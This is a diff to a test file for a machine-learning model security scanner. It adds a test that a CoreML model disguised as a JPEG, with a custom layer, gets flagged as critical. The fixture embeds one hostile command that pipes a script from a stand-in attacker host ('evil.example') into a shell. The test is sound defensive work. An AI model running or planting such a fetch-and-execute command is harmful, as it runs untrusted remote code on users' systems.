@@ -20,7 +20,7 @@ from modelaudit.core import scan_file, scan_model_directory_or_file
 from modelaudit.scanners import flax_msgpack_scanner, jinja2_template_scanner
 from modelaudit.scanners.base import CheckStatus, IssueSeverity, ScanResult
 from modelaudit.utils.helpers.secure_hasher import compute_aggregate_hash
-from tests.helpers import create_mock_gguf, create_mock_onnx, create_mock_pytorch_zip
+from tests.helpers import create_mock_coreml, create_mock_gguf, create_mock_onnx, create_mock_pytorch_zip
 
 _SYSTEM_GLOBAL_NAMES = ("os.system", "posix.system", "nt.system")
 
@@ -1783,6 +1783,22 @@ def test_scan_file_detects_malicious_onnx_pb_by_content(tmp_path: Path) -> None:
     assert not any(check.name == "Format Validation" for check in result.checks)
     assert any(
         issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
+        for issue in result.issues
+    )
+
+
+def test_scan_file_routes_misnamed_coreml_and_detects_custom_layer(tmp_path: Path) -> None:
+    disguised_coreml = create_mock_coreml(
+        tmp_path / "malicious.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+
+    result = scan_file(str(disguised_coreml), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "coreml"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
         for issue in result.issues
     )
 
